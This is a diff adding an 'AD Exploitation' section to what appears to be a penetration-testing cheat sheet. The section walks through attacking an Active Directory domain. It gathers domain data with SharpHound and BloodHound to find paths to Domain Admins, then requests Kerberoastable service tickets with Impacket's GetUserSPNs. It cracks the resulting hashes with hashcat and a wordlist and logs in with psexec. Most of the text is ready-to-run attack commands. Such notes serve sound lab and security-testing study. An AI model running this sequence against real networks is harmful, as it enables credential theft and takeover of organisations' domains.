@@ -1308,7 +1308,63 @@ Try if you are admin
 
     psexec.py <DomainName>/<User>@<ip>
 
+*AD Exploitation*
 
+Switch to Windows 
+
+Open an session in the domain controller
+
+    runas /netonly /user:<domain\User> cmd
+    confirm by
+    dir \\<ip>\<directory> e.g. dir \\10.10.10.100\users
+
+*Test LDAP*
+
+    Test-NetConnection -Computername <ip> -Port 389
+
+*Bloodhound*
+
+In Kali setup the following in order to download the scripts.
+For analysis of Windows Maschines.
+Clone the Collectors folder from https://github.com/GammaG/BloodHound and move the following to windows.
+
+    BloodHound/Collectors/ShareHound.exe
+
+And install Bloodhound in Kali via apt 
+
+In Windows set the DNS Server to the domain. Call in the window with the active domain controller session
+
+    .\SharpHound.exe -c all -d <domain> --domaincontroller <ip>
+    
+This creates a .zip file move this back to Kali
+Setup Neo4j if not yet done.
+
+    bloodhound
+
+In the form drop the zip file.
+After processing use the search
+
+    <user>@<domain>
+
+Common queries
+
+- Find Shortest Paths to Domain Admins 
+- Shortest Paths from Kerberoastable Users
+
+If a user a Kerberoastable (Impacket Tool)
+
+    GetUserSPNs.py -request -dc-ip <ip> <domain>/<user>
+
+If you find this error from Linux: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) it because of your local time, you need to synchronise the host with the DC: ntpdate <IP of DC>
+
+With the has use Hashcat for cracking.
+https://hashcat.net/wiki/doku.php?id=example_hashes
+
+    hashcat -m <mode> cred.txt /usr/share/wordlists/rockyou.txt 
+
+login into the new account
+
+    psexec.py <domain>/<user>@host
 
 **Windows Post Exploitation**
 
